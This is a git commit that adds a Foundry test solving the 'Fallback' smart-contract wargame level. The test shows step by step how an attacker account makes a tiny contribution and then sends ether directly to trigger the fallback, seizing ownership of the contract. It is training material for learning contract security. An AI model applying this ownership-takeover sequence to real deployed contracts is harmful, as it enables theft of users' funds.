7c9f9f66c691c769590979744dbe97c7ffac0112
enzo jakobasch <enzo.jakobasch@gmail.com>
2023-03-29 15:46:35 +0200

    Fallback level

--- test/Fallback/Fallback.t.sol
+++ test/Fallback/Fallback.t.sol
@@ -14,6 +14,8 @@ contract FallbackTest is Test {
         // Set general test settings
         vm.roll(1);
         vm.warp(100);
+        vm.deal(CONTRACT, 1000000000000000000);
+        vm.deal(ATTACKER, 1000000000000000000);
 
         vm.prank(CONTRACT);
         fallbackContract = new Fallback();
@@ -24,12 +26,51 @@ contract FallbackTest is Test {
     }
 
     function test_Attack() public {
-        console.log("-----------------------------------");
-        console.logAddress(address(CONTRACT));
-        console.logAddress(address(ATTACKER));
+        console.log(" ");
+        console.log("====== INIT ========");
+        console.log("deployer address : ");
+        console.log(address(fallbackContract.owner()));
+        console.log("contractOwner address: ");
+        console.log(address(CONTRACT));
         assertEq(fallbackContract.owner(), CONTRACT);
-        // vm.expectRevert("caller is not the owner");
-        // vm.prank(ATTACKER);
-        // test.withdraw();
+
+        console.log(" ");
+        console.log("====== STEP 1 ========");
+        vm.expectRevert("caller is not the owner");
+        vm.prank(ATTACKER);
+        fallbackContract.withdraw();
+
+        vm.prank(CONTRACT);
+        uint contributionOwner = fallbackContract.getContribution();
+        assertEq(contributionOwner, 1000000000000000000000);
+        console.log("contribution owner : ");
+        console.log(contributionOwner);
+        vm.prank(ATTACKER);
+        uint contributionAttacker = fallbackContract.getContribution();
+        assertEq(contributionAttacker, 0);
+        console.log("contribution attacker : ");
+        console.log(contributionAttacker);
+
+        console.log(" ");
+        console.log("====== STEP 2 ========");
+        vm.startPrank(ATTACKER);
+        fallbackContract.contribute{value: 0.0001 ether}();
+        uint newContributionAttacker = fallbackContract.getContribution();
+        assertEq(newContributionAttacker, 100000000000000);
+        console.log("contribution attacker : ");
+        console.log(newContributionAttacker);
+        vm.stopPrank();
+
+        console.log(" ");
+        console.log("====== STEP 3 ========");
+        vm.prank(ATTACKER);
+        (bool sent, ) = address(fallbackContract).call{value: 1}("");
+        assert(sent);
+
+        console.log("contractOwner address : ");
+        console.log(address(fallbackContract.owner()));
+        console.log("attacker address : ");
+        console.log(address(ATTACKER));
+        assertEq(fallbackContract.owner(), ATTACKER);
     }
 }
